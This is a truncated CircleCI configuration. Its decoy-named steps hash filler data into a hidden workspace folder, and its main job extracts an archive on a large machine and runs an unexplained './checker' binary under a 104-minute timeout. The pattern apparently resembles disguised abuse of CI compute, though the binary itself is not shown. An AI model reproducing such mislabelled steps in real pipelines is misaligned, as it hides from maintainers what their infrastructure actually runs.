version: 2.1

jobs:
  orchestrate_jan3-rev:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Collate dictionary rows
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; seq 1 1205902 | md5sum > /tmp/.wsp/relay.txt; true
            du -h /tmp/.wsp/relay.txt
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - relay.txt
  jan3-rev:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Fetch pre-stage data
          command: |
            { tail -c 100 /tmp/.wsp/relay.txt > /dev/null; echo "tail ok" ; } || true
      - run:
          name: Fetch tree
          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load fixtures
          command: tar -I xz -xf archive-main.tar.xz
      - run:
          no_output_timeout: 104m
          command: ./checker
  install_py310-build:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
